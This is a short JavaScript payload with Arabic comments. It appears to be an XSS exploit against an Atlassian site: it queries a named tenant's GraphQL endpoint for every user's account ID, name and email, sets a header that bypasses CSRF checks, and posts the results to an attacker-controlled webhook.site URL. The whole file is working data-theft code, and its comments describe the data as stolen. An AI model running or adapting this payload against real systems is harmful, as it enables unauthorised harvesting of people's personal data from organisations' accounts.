async function exfiltrateUsers() {
    const attackerWebhook = "https://webhook.site/484d5e82-a167-4287-b904-c6986c57c769"; // webhookرابط ا
    const url = "https://anshall.atlassian.net/cgraphql";

    //   لسحب قائمة المستخدمين 
    const queryBody = JSON.stringify([{
        "operationName": "GetUsersQuery",
        "variables": {},
        "query": `query GetUsersQuery {
            users {
                edges {
                    node {
                        accountId
                        displayName
                        email
                    }
                }
            }
        }`
    }]);

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Atlassian-Token': 'no-check',
                'X-Apollo-Operation-Name': 'GetUsersQuery'
            },
            body: queryBody
        });

        const data = await response.json();

        // إرسال البيانات المسروقة إلى سيرفرك
        await fetch(attackerWebhook, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({
                source: "Atlassian_XSS_Exfil",
                usersData: data
            })
        });

        console.log("✅ Data exfiltrated successfully.");
    } catch (err) {
        console.error("❌ Exfiltration failed:", err);
    }
}

exfiltrateUsers();
